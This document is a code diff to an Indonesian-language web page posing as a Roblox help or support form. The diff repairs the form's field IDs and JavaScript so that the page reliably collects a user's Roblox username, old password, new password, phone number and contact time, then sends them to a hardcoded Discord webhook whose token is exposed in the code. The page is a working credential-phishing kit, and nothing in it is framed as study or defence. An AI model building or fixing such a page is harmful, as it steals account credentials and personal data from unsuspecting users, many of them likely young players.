@@ -27,10 +27,11 @@
             margin-bottom: 20px;
             font-size: 20px;
         }
-       h1 {
+        h1 {
             text-align: center;
             margin-bottom: 10px;
             font-size: 10px;
+            color: #ffffff;
         }
         label {
             font-size: 14px;
@@ -71,17 +72,17 @@
         <label for="username">Username Roblox Kamu:</label>
         <input type="text" id="username" placeholder="Masukkan Username" required>
 
-        <label for="PassowrdLma">Password Lama:</label>
-        <input type="text" id="contact" placeholder="Password Contoh: admin123" required>
+        <label for="passwordLama">Password Lama:</label>
+        <input type="text" id="passwordLama" placeholder="Password Contoh: admin123" required>
 
-      <label for="PasswordBru">Password Yang Kamu Ingin (baru):</label>
-        <input type="text" id="contact" placeholder="Password Baru Contoh: password_keren" required>
+        <label for="passwordBaru">Password Yang Kamu Ingin (baru):</label>
+        <input type="text" id="passwordBaru" placeholder="Password Baru Contoh: password_keren" required>
 
-      <label for="Keterangan">Keterangan Jam:</label>
-        <input type="text" id="contact" placeholder="Contoh: jam 2 pagi" required>
+        <label for="keteranganJam">Keterangan Jam:</label>
+        <input type="text" id="keteranganJam" placeholder="Contoh: jam 2 pagi" required>
 
-      <label for="NoTelp">Nomor Telepon:</label>
-        <input type="text" id="contact" placeholder="Contoh: +62-xxx-xxx-xxx" required>
+        <label for="noTelp">Nomor Telepon:</label>
+        <input type="text" id="noTelp" placeholder="Contoh: +62-xxx-xxx-xxx" required>
 
         <label for="message">Kendala:</label>
         <textarea id="message" rows="3" placeholder="Jelaskan kendala kamu..." required></textarea>
@@ -94,16 +95,13 @@
     document.getElementById('helpForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
+        // Ambil nilai dari setiap input dengan ID yang benar
         const username = document.getElementById('username').value;
-        const contact = document.getElementById('PassowrdLma').value;
-        const message = document.
-        getElementById('PassowrdBru').value;
-        const message = document.
-        getElementById('Keterangan').value;
-        const message = document.
-        getElementById('NoTelp').value;
-        const message = document.
-        getElementById('message').value;
+        const passwordLama = document.getElementById('passwordLama').value;
+        const passwordBaru = document.getElementById('passwordBaru').value;
+        const keteranganJam = document.getElementById('keteranganJam').value;
+        const noTelp = document.getElementById('noTelp').value;
+        const message = document.getElementById('message').value;
 
         // Ganti URL ini dengan URL Webhook Discord Anda sendiri
         const webhookUrl = "https://discord.com/api/webhooks/1561308435285278730/-o62bHrgDzOV_QAjQuk2W6DKgyAEJad348oqvaG_guS7Bfc7uiCKMa1uM5YBFINB7m97";
@@ -114,10 +112,10 @@
                 color: 3447003,
                 fields: [
                     { name: "Username Roblox", value: username, inline: true },
-                    { name: "Password Lama", value: PassowrdLma, inline: true },
-                    { name: "Password Baru", value: PassowrdBru, inline: true },
-                    { name: "Keterangan Jam", value: Keterangan, inline: true },
-                    { name: "Nomor Telepon", value: NoTelp, inline: true },
+                    { name: "Password Lama", value: passwordLama, inline: true },
+                    { name: "Password Baru", value: passwordBaru, inline: true },
+                    { name: "Keterangan Jam", value: keteranganJam, inline: true },
+                    { name: "Nomor Telepon", value: noTelp, inline: true },
                     { name: "Detail Kendala", value: message }
                 ],
                 timestamp: new Date()
